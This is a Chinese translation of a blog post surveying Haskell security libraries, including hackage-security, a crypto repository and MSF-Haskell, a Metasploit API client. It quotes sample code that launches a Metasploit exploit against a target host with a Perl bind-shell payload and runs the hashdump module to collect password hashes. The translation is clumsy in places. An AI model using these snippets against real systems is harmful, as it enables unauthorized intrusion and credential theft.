# 在安全领域使用 Haskell 翻译文章]

> 原文：<https://dev.to/nabbisen/haskell---ei7>

本文为以下文章的翻译:
[Security with Haskell](https://dev.to/terceranexus6/security-with-haskell-3cio) by [Paula](https://dev.to/terceranexus6)
<small>*在笔者许可的基础上刊登。</small>

* * *

从“*太疯狂了*”这句话中可以看出“*到底是为什么？ 直到*这句话，当我开始在工作的一部分中使用 Haskell 时，无论是日常还是安全方面的事情，置身于计算机科学世界的朋友们都说了很多话。
按顺序回答吧。
是的，我很疯狂。 但那不是 Haskell 造成的。
而且我还有理由决定在安全领域使用 Haskell。
首先，函数型编程是*新趋势*。 一定会有更多的 APP 用这个制作出来吧。 出于安全目的选择纯函数语言并不那么疯狂。
另一方面，Haskell 的数学方法在使用密码技术方面非常有用。

[![](img/a56f19a0b2fcbcdcd5049b1b2bcdfea0.png)](https://res.cloudinary.com/practicaldev/image/fetch/s--JU9VWTow--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_66%2Cw_880/https://78.media.tumblr.com/tumblr_lpkxtmFtmp1qc8ie7o1_500.gif)

那么，该如何为了安检而使用 Haskell 呢？

这里我想列举一下具体的库。
[被称为 hackage-security](https://hackage.haskell.org/package/hackage-security) 。 目前只支持索引签名。
虽然写在 Wiki 上，但是*这个库有两个主要的入口点:[Hackage.Security.Client](https://hackage.haskell.org/package/hackage-security-0.5.3.0/docs/Hackage-Security-Client.html) 是客户端的主要入口点。 [Hackage.Security.Server](https://hackage.haskell.org/package/hackage-security-0.5.3.0/docs/Hackage-Security-Server.html) 是服务器的主要入口点。*
是值得一看的库。

再来看看其他的，Github 的资源库中还有[MSF-Haskell](https://github.com/GaloisInc/msf-haskell) 。 在 Haskell 上可以进行穿透测试。
作为示例，也包括用 Haskell 编写的脚本。 还有更完整的白皮书。
实际上是 Metasploit API 的安装。 它允许开发人员编写 Haskell 客户端并与 Metasploit 服务器进行交互。
例如，在示例脚本中，利用漏洞对目标主机进行攻击。

```
launchExploit :: (LoudCxt s) => Host Attackable -> MSF s ()
launchExploit targetHost = do
  _ <- module_execute metasploitableModuleType metasploitableModuleName
      $ toObject
      $ Map.fromList
          [ ("RHOST",   toObject targetHost)
          , ("PAYLOAD", toObject metasploitablePayload)
          ]
  return () 
```

Enter fullscreen mode Exit fullscreen mode

我们事先定义了有效载荷本身:

```
metasploitablePayload = Payload "cmd/unix/bind_perl" 
```

Enter fullscreen mode Exit fullscreen mode

或者通过这边的记述获得了密码散列:

```
gatherCredentials :: (LoudCxt s) => SessionId -> MSF s ()
gatherCredentials sessionId = do
  let modTyp = PostModuleType
      modNm = ModuleName "linux/gather/hashdump"

  r <- module_execute modTyp modNm
      $ toObject
      $ Map.fromList
          [ ("SESSION",   toObject sessionId)
          ]
  case r of
    (ExecJobId j) -> waitJob j
    _             -> return () 
```

Enter fullscreen mode Exit fullscreen mode

总之，Haskell 在安全领域有可能成为编写*函数型的*脚本的选择*。
[*Maybe (大概)型的*](https://wiki.haskell.org/Maybe)是个好选择。 也就是说，它是作为一种选择被具体化还是 Nothing。
哈哈，是函数型的笑话。 咚咚·夏恩(说什么)。*

[![](img/67fa2ec4753402e1b56b10f9a213ca1b.png)](https://res.cloudinary.com/practicaldev/image/fetch/s--HSyOSaL3--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/http://cuddlebuggery.com/wp-content/uploads/2012/08/Ba-dum-tish.png)

不管怎么说，这些都是全新类型的攻击手法！ 有些是用划痕开发的，有些则不使用之前描述的 API 实现。
谈谈密码相关的事情，这里的[储存库](https://github.com/mfourne/eccrypto.git)很有趣。 处理椭圆曲线密码。
那么，我建议你们所有人，在官方的 Haskell 网站上，安全的[资源库](https://hackage.haskell.org/packages/search?terms=security)也是如此，不过，请浏览一下[密码技术的资源库](https://hackage.haskell.org/packages/search?terms=cryptography)。
我现在还在调查中。 因此，如果任何人都在这个同一领域活动的话，我们将等待进一步的信息！

* * *

谢谢您的阅读。

本文是以下文章的翻译:
[Security with Haskell](https://dev.to/terceranexus6/security-with-haskell-3cio) by [Paula](https://dev.to/terceranexus6)

致宝拉:非常感谢你的许可和考虑，让我翻译你的文章。